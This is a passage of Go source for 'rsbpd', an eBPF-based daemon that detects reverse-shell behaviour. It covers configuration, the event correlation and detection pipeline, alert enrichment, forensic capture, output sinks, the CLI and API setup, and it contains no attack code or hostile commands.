package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/prometheus/client_golang/prometheus/promhttp"
	"github.com/spf13/cobra"
	"go.uber.org/zap"

	"github.com/yoursec/rsbp/internal/alert"
	"github.com/yoursec/rsbp/internal/api"
	"github.com/yoursec/rsbp/internal/correlation"
	"github.com/yoursec/rsbp/internal/detection"
	"github.com/yoursec/rsbp/internal/ebpf"
	"github.com/yoursec/rsbp/internal/enrichment"
	"github.com/yoursec/rsbp/internal/forensics"
	plog "github.com/yoursec/rsbp/internal/logging"
	"github.com/yoursec/rsbp/internal/output"
	"github.com/yoursec/rsbp/internal/types"
	"github.com/yoursec/rsbp/internal/watchdog"
)

var (
	Version   = "dev"
	BuildTime = "unknown"
)

const (
	sysExecve  = 59
	sysSocket  = 41
	sysConnect = 42
	sysDup2    = 33
)

type appConfig struct {
	ConfigVersion string `mapstructure:"config_version"`
	RSBP          struct {
		Agent struct {
			Hostname        string `mapstructure:"hostname"`
			LogLevel        string `mapstructure:"log_level"`
			PIDFile         string `mapstructure:"pid_file"`
			MaxEventsPerSec int    `mapstructure:"max_events_per_sec"`
		} `mapstructure:"agent"`
		EBPF struct {
			RingBufferSize int `mapstructure:"ring_buffer_size"`
		} `mapstructure:"ebpf"`
		Correlation struct {
			WindowSeconds          int `mapstructure:"window_seconds"`
			CleanupIntervalSeconds int `mapstructure:"cleanup_interval_seconds"`
		} `mapstructure:"correlation"`
		Detection struct {
			WindowSeconds      int     `mapstructure:"window_seconds"`
			ScoreThreshold     float64 `mapstructure:"score_threshold"`
			AllowPrivateRemote bool    `mapstructure:"allow_private_remote"`
			EnableBaseline     bool    `mapstructure:"enable_baseline"`
			BaselineFile       string  `mapstructure:"baseline_file"`
		} `mapstructure:"detection"`
		Whitelist struct {
			Paths        []string `mapstructure:"paths"`
			IPs          []string `mapstructure:"ips"`
			Users        []uint32 `mapstructure:"users"`
			ProcessNames []string `mapstructure:"process_names"`
		} `mapstructure:"whitelist"`
		Enrichment struct {
			GeoIPDBCity     string `mapstructure:"geoip_db_city"`
			GeoIPDBASN      string `mapstructure:"geoip_db_asn"`
			AbuseIPDBCache  string `mapstructure:"abuseipdb_cache"`
			AbuseIPDBAPIKey string `mapstructure:"abuseipdb_api_key"`
			TimeoutSeconds  int    `mapstructure:"timeout_seconds"`
		} `mapstructure:"enrichment"`
		Forensics struct {
			Enabled          bool   `mapstructure:"enabled"`
			OutputDir        string `mapstructure:"output_dir"`
			CapturePCAP      bool   `mapstructure:"capture_pcap"`
			PCAPDurationSecs int    `mapstructure:"pcap_duration_seconds"`
			PCAPMaxBytes     int    `mapstructure:"pcap_max_bytes"`
		} `mapstructure:"forensics"`
		Outputs struct {
			JSONL struct {
				Enabled bool   `mapstructure:"enabled"`
				Path    string `mapstructure:"path"`
			} `mapstructure:"jsonl"`
			Elasticsearch struct {
				Enabled   bool     `mapstructure:"enabled"`
				Addresses []string `mapstructure:"addresses"`
				TLSCACert string   `mapstructure:"tls_ca_cert"`
			} `mapstructure:"elasticsearch"`
			Splunk struct {
				Enabled bool   `mapstructure:"enabled"`
				URL     string `mapstructure:"url"`
				Token   string `mapstructure:"token"`
			} `mapstructure:"splunk"`
			Kafka struct {
				Enabled bool     `mapstructure:"enabled"`
				Brokers []string `mapstructure:"brokers"`
				Topic   string   `mapstructure:"topic"`
			} `mapstructure:"kafka"`
			Syslog struct {
				Enabled bool   `mapstructure:"enabled"`
				Network string `mapstructure:"network"`
				Address string `mapstructure:"address"`
			} `mapstructure:"syslog"`
			Webhook struct {
				Enabled bool   `mapstructure:"enabled"`
				URL     string `mapstructure:"url"`
				Secret  string `mapstructure:"secret"`
			} `mapstructure:"webhook"`
		} `mapstructure:"outputs"`
		API struct {
			Enabled       bool   `mapstructure:"enabled"`
			Listen        string `mapstructure:"listen"`
			MetricsListen string `mapstructure:"metrics_listen"`
			BearerToken   string `mapstructure:"bearer_token"`
		} `mapstructure:"api"`
	} `mapstructure:"rsbp"`
	Runtime struct {
		ConfigValidationMode  string   `mapstructure:"-" json:"-"`
		ValidWhitelistPaths   []string `mapstructure:"-" json:"-"`
		SkippedWhitelistPaths []string `mapstructure:"-" json:"-"`
		RemovedWhitelistPaths []string `mapstructure:"-" json:"-"`
	} `mapstructure:"-" json:"-"`
}

type alertSink interface {
	Send(ctx context.Context, a *types.ReverseShellAlert) error
	Close()
}

type reloadableSink struct {
	mu   sync.RWMutex
	sink alertSink
}

type panicDetails struct {
	Where     string
	Timestamp time.Time
	Recovered any
	Stack     string
}

func enforceWorkspacePolicy() {
	wd, err := os.Getwd()
	if err != nil {
		log.Fatalf("failed to get working directory: %v", err)
	}

	env := strings.ToLower(os.Getenv("RSBP_ENV"))
	if env == "" {
		env = "dev"
	}

	if strings.HasPrefix(wd, "/mnt/") {
		msg := "Running from /mnt is not supported due to filesystem inconsistency (WSL 9p issue). Move project to ~/rsbp."

		if env == "dev" {
			log.Fatalf("❌ %s\nCurrent path: %s", msg, wd)
		} else {
			log.Printf("⚠️ WARNING: %s\nCurrent path: %s", msg, wd)
		}
	}

	log.Printf("✅ Workspace OK: %s (env=%s)", wd, env)
}

func (r *reloadableSink) Send(ctx context.Context, a *types.ReverseShellAlert) error {
	r.mu.RLock()
	s := r.sink
	r.mu.RUnlock()
	if s == nil {
		return fmt.Errorf("sink is not configured")
	}
	return s.Send(ctx, a)
}

func (r *reloadableSink) Swap(next alertSink) {
	r.mu.Lock()
	prev := r.sink
	r.sink = next
	r.mu.Unlock()
	if prev != nil {
		prev.Close()
	}
}

func (r *reloadableSink) Close() {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.sink != nil {
		r.sink.Close()
		r.sink = nil
	}
}

func safeGo(wg *sync.WaitGroup, where string, logger *zap.Logger, cancel context.CancelFunc, panicCh chan<- panicDetails, fn func()) {
	if wg != nil {
		wg.Add(1)
	}
	go func() {
		if wg != nil {
			defer wg.Done()
		}
		defer recoverAndReportPanic(where, logger, cancel, panicCh)
		fn()
	}()
}

func recoverAndReportPanic(where string, logger *zap.Logger, cancel context.CancelFunc, panicCh chan<- panicDetails) {
	r := recover()
	if r == nil {
		return
	}

	details := panicDetails{
		Where:     where,
		Timestamp: time.Now().UTC(),
		Recovered: r,
		Stack:     string(debug.Stack()),
	}

	logger.Error("panic recovered in goroutine",
		zap.String("where", details.Where),
		zap.Any("panic", details.Recovered),
		zap.String("stack", details.Stack),
	)

	if err := writeCrashReport(details); err != nil {
		logger.Error("failed to write crash report", zap.Error(err))
	}

	if cancel != nil {
		cancel()
	}

	if panicCh != nil {
		select {
		case panicCh <- details:
		default:
		}
	}
}

func writeCrashReport(details panicDetails) error {
	const crashLogPath = "/var/log/rsbp/crash.log"
	if err := os.MkdirAll(filepath.Dir(crashLogPath), 0o755); err != nil {
		return err
	}

	f, err := os.OpenFile(crashLogPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return err
	}
	defer func() {
		if closeErr := f.Close(); closeErr != nil {
			fmt.Fprintf(os.Stderr, "warning: failed to close crash log: %v\n", closeErr)
		}
	}()

	_, err = fmt.Fprintf(f,
		"[%s] panic in %s: %v\n%s\n",
		details.Timestamp.Format(time.RFC3339Nano),
		details.Where,
		details.Recovered,
		details.Stack,
	)
	return err
}

func validateStartupPrerequisites(cfg *appConfig, logger *zap.Logger) error {
	issues := make([]string, 0, 4)

	if _, err := os.Stat("/sys/kernel/btf/vmlinux"); err != nil {
		issues = append(issues, "missing BTF support file: /sys/kernel/btf/vmlinux")
	}
	if st, err := os.Stat("/sys/kernel/debug/tracing"); err != nil || !st.IsDir() {
		issues = append(issues, "tracepoints path unavailable: /sys/kernel/debug/tracing")
	}

	for _, dir := range []string{"/var/log/rsbp", "/var/lib/rsbp"} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			issues = append(issues, fmt.Sprintf("failed to create %s: %v", dir, err))
			continue
		}
		if err := assertWritableDir(dir); err != nil {
			issues = append(issues, fmt.Sprintf("directory not writable: %s (%v)", dir, err))
		}
	}

	for _, geoPath := range []string{strings.TrimSpace(cfg.RSBP.Enrichment.GeoIPDBCity), strings.TrimSpace(cfg.RSBP.Enrichment.GeoIPDBASN)} {
		if geoPath == "" {
			continue
		}
		if _, err := os.Stat(geoPath); err != nil {
			logger.Warn("GeoIP database file missing", zap.String("path", geoPath), zap.Error(err))
		}
	}

	if len(issues) > 0 {
		return fmt.Errorf("startup validation failed:\n- %s", strings.Join(issues, "\n- "))
	}

	return nil
}

func assertWritableDir(dir string) error {
	tmpFile, err := os.CreateTemp(dir, ".rsbp-writecheck-*")
	if err != nil {
		return err
	}
	name := tmpFile.Name()
	if closeErr := tmpFile.Close(); closeErr != nil {
		return closeErr
	}
	return os.Remove(name)
}

func main() {
	enforceWorkspacePolicy()

	rootCmd := &cobra.Command{
		Use:   "rsbpd",
		Short: "Reverse Shell Behavior Profiler daemon",
	}

	var cfgPath string
	rootCmd.PersistentFlags().StringVar(&cfgPath, "config", "config/rsbp.yaml", "Path to config file")

	runCmd := &cobra.Command{Use: "run", Short: "Start the daemon", RunE: func(cmd *cobra.Command, args []string) error {
		return runDaemon(cfgPath)
	}}

	statusCmd := &cobra.Command{Use: "status", Short: "Print daemon status", RunE: func(cmd *cobra.Command, args []string) error {
		cfg, err := loadConfig(cfgPath)
		if err != nil {
			return err
		}
		return printJSONFromAPI("http://"+cfg.RSBP.API.Listen+"/health", cfg.RSBP.API.BearerToken)
	}}

	var follow bool
	alertsCmd := &cobra.Command{Use: "alerts", Short: "Tail local alerts JSONL", RunE: func(cmd *cobra.Command, args []string) error {
		cfg, err := loadConfig(cfgPath)
		if err != nil {
			return err
		}
		return tailAlerts(cfg.RSBP.Outputs.JSONL.Path, follow)
	}}
	alertsCmd.Flags().BoolVar(&follow, "follow", false, "Follow appended alerts")

	whitelistCmd := &cobra.Command{Use: "whitelist", Short: "Manage whitelist via API"}
	var wlIP, wlPath string
	whitelistAddCmd := &cobra.Command{Use: "add", Short: "Add whitelist entry", RunE: func(cmd *cobra.Command, args []string) error {
		cfg, err := loadConfig(cfgPath)
		if err != nil {
			return err
		}
		body := map[string]any{"ips": []string{}, "paths": []string{}}
		if wlIP != "" {
			body["ips"] = []string{wlIP}
		}
		if wlPath != "" {
			body["paths"] = []string{wlPath}
		}
		return postJSON("http://"+cfg.RSBP.API.Listen+"/whitelist", body, cfg.RSBP.API.BearerToken)
	}}
	whitelistAddCmd.Flags().StringVar(&wlIP, "ip", "", "IP/CIDR whitelist entry")
	whitelistAddCmd.Flags().StringVar(&wlPath, "path", "", "Executable path whitelist entry")
	whitelistCmd.AddCommand(whitelistAddCmd)

	testCmd := &cobra.Command{Use: "test", Short: "Run self-test via API synthetic event", RunE: func(cmd *cobra.Command, args []string) error {
		return runSelfTest(cfgPath)
	}}

	versionCmd := &cobra.Command{Use: "version", Short: "Print build and runtime version information", Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("version=%s\nbuild_time=%s\ngo=%s\nkernel_requirement=%s\n", Version, BuildTime, runtime.Version(), ">=5.8")
	}}

	rootCmd.AddCommand(runCmd, statusCmd, alertsCmd, whitelistCmd, testCmd, versionCmd)
	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func runDaemon(configPath string) error {
	bootstrapLogger, bootstrapErr := zap.NewProduction()
	if bootstrapErr != nil {
		return fmt.Errorf("bootstrap logger init failed: %w", bootstrapErr)
	}
	defer func() { _ = bootstrapLogger.Sync() }()

	cfg, err := loadConfigWithLogger(configPath, bootstrapLogger)
	if err != nil {
		return err
	}

	logger, err := newConfiguredLogger(cfg.RSBP.Agent.LogLevel)
	if err != nil {
		return fmt.Errorf("logger init failed: %w", err)
	}
	defer func() {
		_ = logger.Sync()
	}()

	workingDir, _ := os.Getwd()
	goModPath := detectGoModPath(workingDir)
	logger.Info("startup environment",
		zap.String("working_dir", workingDir),
		zap.String("go_mod_path", goModPath),
		zap.String("go_version", runtime.Version()),
	)
	if strings.HasPrefix(workingDir, "/mnt/") {
		logger.Warn("workspace is on WSL mounted Windows filesystem; consider moving to native Linux FS for deterministic tooling",
			zap.String("current_path", workingDir),
			zap.String("recommended_path", "~/rsbp"),
		)
	}

	rootCtx, cancel := context.WithCancel(context.Background())
	defer cancel()
	panicCh := make(chan panicDetails, 1)

	runtimeEnv := ebpf.DetectRuntimeEnvironment()
	logger.Info("runtime environment detected",
		zap.Bool("is_linux", runtimeEnv.IsLinux),
		zap.Bool("is_wsl", runtimeEnv.IsWSL),
		zap.Bool("is_container", runtimeEnv.IsContainer),
		zap.String("kernel_release", runtimeEnv.KernelRelease),
	)
	if runtimeEnv.IsWSL {
		logger.Warn("running under WSL; eBPF support can be limited",
			zap.String("recommendation", "use latest WSL2 kernel and run rsbpd with CAP_BPF/CAP_SYS_ADMIN"),
		)
	}

	if cfg.RSBP.Agent.Hostname == "" {
		hostname, hostErr := os.Hostname()
		if hostErr == nil {
			cfg.RSBP.Agent.Hostname = hostname
		} else {
			cfg.RSBP.Agent.Hostname = "unknown-host"
		}
	}

	hostOS := detectOSName()
	kernelVersion := detectKernelVersion()
	agentVersion := Version
	if strings.TrimSpace(agentVersion) == "" {
		agentVersion = "dev"
	}

	logger.Info(fmt.Sprintf("RSBP v%s starting on %s kernel %s", agentVersion, cfg.RSBP.Agent.Hostname, kernelVersion))

	if err := validateStartupPrerequisites(cfg, logger); err != nil {
		return err
	}

	if cfg.RSBP.Agent.PIDFile != "" {
		if err := os.WriteFile(cfg.RSBP.Agent.PIDFile, []byte(strconv.Itoa(os.Getpid())), 0o644); err != nil {
			logger.Warn("failed to write PID file", zap.String("path", cfg.RSBP.Agent.PIDFile), zap.Error(err))
		}
		defer os.Remove(cfg.RSBP.Agent.PIDFile)
	}

	var eventsProcessed atomic.Uint64
	var ebpfLoaded atomic.Bool
	tracker := newPipelineTracker(logger)

	eventCh := make(chan types.SyscallEvent, 10000)
	correlatedSessionCh := make(chan *correlation.SessionState, 1024)
	rawAlertCh := make(chan *types.ReverseShellAlert, 1024)
	finalAlertCh := make(chan *types.ReverseShellAlert, 1024)

	safeGo(nil, "tracker.startEPSMonitor", logger, cancel, panicCh, func() { tracker.startEPSMonitor(rootCtx) })
	safeGo(nil, "tracker.startDeadPipelineMonitor", logger, cancel, panicCh, func() { tracker.startDeadPipelineMonitor(rootCtx, 30) })
	safeGo(nil, "tracker.startQueueMonitor", logger, cancel, panicCh, func() {
		tracker.startQueueMonitor(rootCtx, []queueProbe{
			{Name: "event_ch", Len: func() int { return len(eventCh) }, Cap: cap(eventCh)},
			{Name: "correlated_session_ch", Len: func() int { return len(correlatedSessionCh) }, Cap: cap(correlatedSessionCh)},
			{Name: "raw_alert_ch", Len: func() int { return len(rawAlertCh) }, Cap: cap(rawAlertCh)},
			{Name: "final_alert_ch", Len: func() int { return len(finalAlertCh) }, Cap: cap(finalAlertCh)},
		})
	})
	safeGo(nil, "tracker.startSyntheticChecks", logger, cancel, panicCh, func() { tracker.startSyntheticChecks(rootCtx, 60) })

	ebpfLoader, err := ebpf.New(logger)
	if err != nil {
		return reportEBPFStartupError(logger, err)
	}
	ebpfLoaded.Store(true)
	defer func() {
		if closeErr := ebpfLoader.Close(); closeErr != nil {
			logger.Warn("failed to close ebpf loader", zap.Error(closeErr))
		}
	}()
	ebpfLoader.ProbeHealthCheck(rootCtx)

	correlator := correlation.New(time.Duration(cfg.RSBP.Detection.WindowSeconds)*time.Second, correlatedSessionCh, logger)
	correlation.SetAllowPrivateRemote(cfg.RSBP.Detection.AllowPrivateRemote)
	detector := detection.NewEngine(detection.Config{
		ExecConnectWindowSeconds: cfg.RSBP.Detection.WindowSeconds,
		MinScore:                 cfg.RSBP.Detection.ScoreThreshold,
		EnableBaseline:           cfg.RSBP.Detection.EnableBaseline,
		BaselineFile:             cfg.RSBP.Detection.BaselineFile,
		Whitelist: detection.WhitelistConfig{
			Paths:        append([]string(nil), cfg.RSBP.Whitelist.Paths...),
			IPs:          append([]string(nil), cfg.RSBP.Whitelist.IPs...),
			Users:        append([]uint32(nil), cfg.RSBP.Whitelist.Users...),
			ProcessNames: append([]string(nil), cfg.RSBP.Whitelist.ProcessNames...),
		},
	}, logger)
	enricher := enrichment.NewEnricher(enrichment.Config{
		GeoIPDBPath:      cfg.RSBP.Enrichment.GeoIPDBCity,
		ASNDBPath:        cfg.RSBP.Enrichment.GeoIPDBASN,
		AbuseCachePath:   cfg.RSBP.Enrichment.AbuseIPDBCache,
		AbuseIPDBAPIKey:  cfg.RSBP.Enrichment.AbuseIPDBAPIKey,
		AbuseIPDBEnabled: cfg.RSBP.Enrichment.AbuseIPDBAPIKey != "",
	}, logger)
	defer func() {
		if err := enricher.Close(); err != nil {
			logger.Warn("failed to close enricher", zap.Error(err))
		}
	}()
	collector := forensics.NewCollector(forensics.Config{
		ArtifactDir:    cfg.RSBP.Forensics.OutputDir,
		EnableMiniPCAP: cfg.RSBP.Forensics.Enabled && cfg.RSBP.Forensics.CapturePCAP,
	}, logger)
	if err := collector.CleanupOldBundles(7*24*time.Hour, 2048); err != nil {
		logger.Warn("startup forensics cleanup failed", zap.Error(err), zap.String("pipeline_stage", "forensics"))
	}
	collector.StartPeriodicCleanup(rootCtx, 7*24*time.Hour, 2048, 6*time.Hour)
	collectorCfg := forensics.CollectorConfig{
		PCAPDuration: time.Duration(cfg.RSBP.Forensics.PCAPDurationSecs) * time.Second,
		PCAPMaxBytes: int64(cfg.RSBP.Forensics.PCAPMaxBytes),
		CapturePCAP:  cfg.RSBP.Forensics.Enabled && cfg.RSBP.Forensics.CapturePCAP,
	}

	outputCfg := output.Config{}
	if cfg.RSBP.Outputs.JSONL.Enabled {
		outputCfg.Enabled = append(outputCfg.Enabled, "jsonl")
	}
	if cfg.RSBP.Outputs.Elasticsearch.Enabled {
		outputCfg.Enabled = append(outputCfg.Enabled, "elasticsearch")
	}
	if cfg.RSBP.Outputs.Splunk.Enabled {
		outputCfg.Enabled = append(outputCfg.Enabled, "splunk")
	}
	if cfg.RSBP.Outputs.Kafka.Enabled {
		outputCfg.Enabled = append(outputCfg.Enabled, "kafka")
	}
	if cfg.RSBP.Outputs.Syslog.Enabled {
		outputCfg.Enabled = append(outputCfg.Enabled, "syslog")
	}
	if cfg.RSBP.Outputs.Webhook.Enabled {
		outputCfg.Enabled = append(outputCfg.Enabled, "webhook")
	}
	outputCfg.JSONL.Path = cfg.RSBP.Outputs.JSONL.Path
	outputCfg.Elasticsearch.Addresses = cfg.RSBP.Outputs.Elasticsearch.Addresses
	outputCfg.Elasticsearch.CertPath = cfg.RSBP.Outputs.Elasticsearch.TLSCACert
	outputCfg.Splunk.Endpoint = cfg.RSBP.Outputs.Splunk.URL
	outputCfg.Splunk.Token = cfg.RSBP.Outputs.Splunk.Token
	outputCfg.Splunk.Hostname = cfg.RSBP.Agent.Hostname
	outputCfg.Kafka.Brokers = cfg.RSBP.Outputs.Kafka.Brokers
	outputCfg.Kafka.Topic = cfg.RSBP.Outputs.Kafka.Topic
	outputCfg.Syslog.Network = cfg.RSBP.Outputs.Syslog.Network
	outputCfg.Syslog.Address = cfg.RSBP.Outputs.Syslog.Address
	outputCfg.Webhook.URL = cfg.RSBP.Outputs.Webhook.URL
	outputCfg.Webhook.Secret = cfg.RSBP.Outputs.Webhook.Secret

	sinks, err := output.NewSinks(outputCfg, logger)
	if err != nil {
		return fmt.Errorf("failed to initialize outputs: %w", err)
	}
	reloadable := &reloadableSink{sink: sinks}
	defer reloadable.Close()
	emitter := alert.NewEmitter(reloadable, logger)

	wd := watchdog.New(
		logger,
		func(context.Context) error { return ebpfLoader.ReattachProbes() },
		func() map[string]any { return detector.WhitelistSnapshot() },
		"/var/log/rsbp",
		cfg.RSBP.Outputs.JSONL.Path,
		cfg.RSBP.Forensics.OutputDir,
	)
	safeGo(nil, "watchdog", logger, cancel, panicCh, func() { wd.Run(rootCtx) })

	var wg sync.WaitGroup

	// Correlation consumer is started first to guarantee receiver readiness before loader sends events.
	safeGo(&wg, "correlation_consumer", logger, cancel, panicCh, func() {
		defer close(correlatedSessionCh)
		logger.Info("DEBUG CORRELATION CONSUMER STARTED")
		for {
			select {
			case <-rootCtx.Done():
				logger.Info("DEBUG CORRELATION CONSUMER STOPPED", zap.String("reason", "context_done"))
				return
			case ev, ok := <-eventCh:
				if !ok {
					logger.Info("DEBUG CORRELATION CONSUMER STOPPED", zap.String("reason", "event_channel_closed"))
					return
				}
				wd.NoteEvent(ev.ReceivedAt)
				tracker.markEvent()
				correlator.Process(ev)
			}
		}
	})

	// Kernel event collection runs independently so userspace processing can apply backpressure.
	safeGo(&wg, "ebpf_loader_run", logger, cancel, panicCh, func() {
		defer close(eventCh)
		if runErr := ebpfLoader.Run(rootCtx, eventCh); runErr != nil && !errors.Is(runErr, context.Canceled) {
			logger.Error("ebpf collector exited with error", zap.Error(runErr))
			cancel()
		}
	})

	// Detection consumes completed correlated sessions.
	safeGo(&wg, "detection_consumer", logger, cancel, panicCh, func() {
		defer close(rawAlertCh)
		for session := range correlatedSessionCh {
			tracker.markSession()
			eventsProcessed.Add(1)
			ev := types.SyscallEvent{TimestampNS: uint64(time.Now().UnixNano())}
			alerts := detector.Evaluate(session, ev, cfg.RSBP.Agent.Hostname)
			for _, a := range alerts {
				tracker.markAlertGenerated()
				sendStart := time.Now()
				select {
				case rawAlertCh <- a:
					tracker.observeChannelSend("raw_alert_ch", time.Since(sendStart))
				case <-rootCtx.Done():
					return
				}
			}
		}
	})

	// Enrichment and forensic collection happen after detection to limit expensive operations.
	safeGo(&wg, "enrichment_forensics_pipeline", logger, cancel, panicCh, func() {
		defer close(finalAlertCh)
		for a := range rawAlertCh {
			loggerWithStage := plog.PipelineLogger(logger, a.AlertID, "enrichment")
			if a.Metadata == nil {
				a.Metadata = map[string]string{}
			}
			a.Metadata["hostname"] = cfg.RSBP.Agent.Hostname
			a.Metadata["os"] = hostOS
			a.Metadata["kernel_version"] = kernelVersion
			a.Metadata["agent_version"] = agentVersion
			enricher.EnrichAlert(rootCtx, a)
			if cfg.RSBP.Forensics.Enabled {
				collector.Collect(rootCtx, a, collectorCfg)
			}
			if !a.PipelineStart.IsZero() {
				loggerWithStage.Debug("enrichment/forensics stage completed",
					zap.Float64("latency_ms", float64(time.Since(a.PipelineStart).Microseconds())/1000.0),
				)
			}
			sendStart := time.Now()
			select {
			case finalAlertCh <- a:
				tracker.observeChannelSend("final_alert_ch", time.Since(sendStart))
			case <-rootCtx.Done():
				return
			}
		}
	})

	if cfg.RSBP.API.Enabled {
		if cfg.RSBP.API.MetricsListen != "" {
			safeGo(nil, "metrics_http_server", logger, cancel, panicCh, func() {
				mux := http.NewServeMux()
				mux.Handle("/metrics", promhttp.Handler())
				_ = (&http.Server{Addr: cfg.RSBP.API.MetricsListen, Handler: mux}).ListenAndServe()
			})
		}

		apiSrv := api.NewServer(api.Config{
			Enabled:       cfg.RSBP.API.Enabled,
			Listen:        cfg.RSBP.API.Listen,
			MetricsListen: cfg.RSBP.API.MetricsListen,
			BearerToken:   cfg.RSBP.API.BearerToken,
			AlertsPath:    cfg.RSBP.Outputs.JSONL.Path,
		}, logger, &eventsProcessed, func() map[string]any {
			stats := ebpfLoader.Stats()
			corrStats := correlator.MetricsSnapshot()
			detStats := detector.MetricsSnapshot()
			sinkStats := output.SnapshotSinkMetrics()

			jsonlStats := sinkStats["jsonl"]
			esStats := sinkStats["elasticsearch"]

			return map[string]any{
				"version":  agentVersion,
				"hostname": cfg.RSBP.Agent.Hostname,
				"ebpf": map[string]any{
					"loaded":            ebpfLoaded.Load(),
					"probes_attached":   stats.AttachedProbes,
					"events_total":      stats.EventsRead,
					"events_per_second": stats.EventsPerSecond,
					"lost_events":       stats.LostEvents,
				},
				"pipeline": map[string]any{
					"sessions_active":    corrStats.SessionsActive,
					"sessions_completed": corrStats.SessionsCompleted,
					"detections_total":   detStats.DetectionsTotal,
					"suppressed_total":   detStats.SuppressedTotal,
					"alerts_emitted":     tracker.alertsEmitted.Load(),
				},
				"watchdog": wd.Snapshot(),
				"outputs": map[string]any{
					"jsonl": map[string]any{
						"enabled":        cfg.RSBP.Outputs.JSONL.Enabled,
						"alerts_written": jsonlStats.Emitted,
					},
					"elasticsearch": map[string]any{
						"enabled":     cfg.RSBP.Outputs.Elasticsearch.Enabled,
						"alerts_sent": esStats.Emitted,
						"errors":      esStats.Failed,
					},
				},
			}
		}, func() map[string]any {
			stats := ebpfLoader.Stats()
			return tracker.deepHealth(ebpfLoaded.Load(), stats.LostEvents)
		}, func() map[string]any {
			stats := ebpfLoader.Stats()
			corrStats := correlator.MetricsSnapshot()
			detStats := detector.MetricsSnapshot()
			return map[string]any{
				"ebpf":           stats,
				"pipeline":       corrStats,
				"detection":      detStats,
				"avg_latency_ms": output.AverageAlertLatencyMS(),
				"alerts_emitted": output.TotalAlertsEmitted(),
			}
		}, func() any {
			return map[string]any{
				"environment_mode": cfg.Runtime.ConfigValidationMode,
				"active_config":    redactConfigForDebug(cfg),
				"removed_entries": map[string]any{
					"whitelist_paths": append([]string(nil), cfg.Runtime.RemovedWhitelistPaths...),
				},
			}
		}, func(context.Context) ([]string, error) {
			newCfg, err := loadConfigWithLogger(configPath, logger)
			if err != nil {
				return nil, err
			}
			cfg = newCfg

			detector.ReloadWhitelist(detection.WhitelistConfig{
				Paths:        append([]string(nil), newCfg.RSBP.Whitelist.Paths...),
				IPs:          append([]string(nil), newCfg.RSBP.Whitelist.IPs...),
				Users:        append([]uint32(nil), newCfg.RSBP.Whitelist.Users...),
				ProcessNames: append([]string(nil), newCfg.RSBP.Whitelist.ProcessNames...),
			})
			detector.SetMinScore(newCfg.RSBP.Detection.ScoreThreshold)

			newOutputCfg := output.Config{}
			if newCfg.RSBP.Outputs.JSONL.Enabled {
				newOutputCfg.Enabled = append(newOutputCfg.Enabled, "jsonl")
			}
			if newCfg.RSBP.Outputs.Elasticsearch.Enabled {
				newOutputCfg.Enabled = append(newOutputCfg.Enabled, "elasticsearch")
			}
			if newCfg.RSBP.Outputs.Splunk.Enabled {
				newOutputCfg.Enabled = append(newOutputCfg.Enabled, "splunk")
			}
			if newCfg.RSBP.Outputs.Kafka.Enabled {
				newOutputCfg.Enabled = append(newOutputCfg.Enabled, "kafka")
			}
			if newCfg.RSBP.Outputs.Syslog.Enabled {
				newOutputCfg.Enabled = append(newOutputCfg.Enabled, "syslog")
			}
			if newCfg.RSBP.Outputs.Webhook.Enabled {
				newOutputCfg.Enabled = append(newOutputCfg.Enabled, "webhook")
			}
			newOutputCfg.JSONL.Path = newCfg.RSBP.Outputs.JSONL.Path
			newOutputCfg.Elasticsearch.Addresses = newCfg.RSBP.Outputs.Elasticsearch.Addresses
			newOutputCfg.Elasticsearch.CertPath = newCfg.RSBP.Outputs.Elasticsearch.TLSCACert
			newOutputCfg.Splunk.Endpoint = newCfg.RSBP.Outputs.Splunk.URL
			newOutputCfg.Splunk.Token = newCfg.RSBP.Outputs.Splunk.Token
			newOutputCfg.Splunk.Hostname = newCfg.RSBP.Agent.Hostname
			newOutputCfg.Kafka.Brokers = newCfg.RSBP.Outputs.Kafka.Brokers
			newOutputCfg.Kafka.Topic = newCfg.RSBP.Outputs.Kafka.Topic
			newOutputCfg.Syslog.Network = newCfg.RSBP.Outputs.Syslog.Network
			newOutputCfg.Syslog.Address = newCfg.RSBP.Outputs.Syslog.Address
			newOutputCfg.Webhook.URL = newCfg.RSBP.Outputs.Webhook.URL
			newOutputCfg.Webhook.Secret = newCfg.RSBP.Outputs.Webhook.Secret

			nextSinks, nextErr := output.NewSinks(newOutputCfg, logger)
			if nextErr == nil {
				reloadable.Swap(nextSinks)
			}

			return []string{"whitelist", "detection", "outputs"}, nextErr
		}, func(context.Context) error {
			synthetic := types.SyscallEvent{PID: 99999, TimestampNS: uint64(time.Now().UnixNano())}
			sendStart := time.Now()
			select {
			case eventCh <- synthetic:
				tracker.observeChannelSend("event_ch", time.Since(sendStart))
				return nil
			default:
				return fmt.Errorf("event channel busy")
			}
		})

		safeGo(&wg, "api_server", logger, cancel, panicCh, func() {
			if err := apiSrv.Run(rootCtx); err != nil && !errors.Is(err, http.ErrServerClosed) {
				logger.Error("api server failed", zap.Error(err))
				cancel()
			}
		})
	}

	// Emission is isolated from detection to avoid sink outages blocking core telemetry.
	safeGo(&wg, "alert_emitter", logger, cancel, panicCh, func() {
		for a := range finalAlertCh {
			alertLogger := plog.PipelineLogger(logger, a.AlertID, "output")
			latencyBase := a.PipelineStart
			if latencyBase.IsZero() {
				latencyBase = a.Timestamp
			}
			if !latencyBase.IsZero() {
				latency := time.Since(latencyBase)
				if latency > 100*time.Millisecond {
					alertLogger.Warn("pipeline latency exceeded threshold",
						zap.Float64("latency_ms", float64(latency.Microseconds())/1000.0),
					)
				}
			}
			if emitErr := emitter.Emit(rootCtx, a); emitErr != nil {
				alertLogger.Error("failed to emit alert", zap.Error(emitErr))
				continue
			}
			wd.NoteAlert(time.Now().UTC())
			tracker.markAlertEmitted()
		}
	})

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	var panicEvent *panicDetails
	select {
	case sig := <-sigCh:
		logger.Info("shutdown signal received", zap.String("signal", sig.String()))
		cancel()
	case pd := <-panicCh:
		panicEvent = &pd
		logger.Error("panic-triggered shutdown initiated", zap.String("where", pd.Where))
		cancel()
	case <-rootCtx.Done():
	}

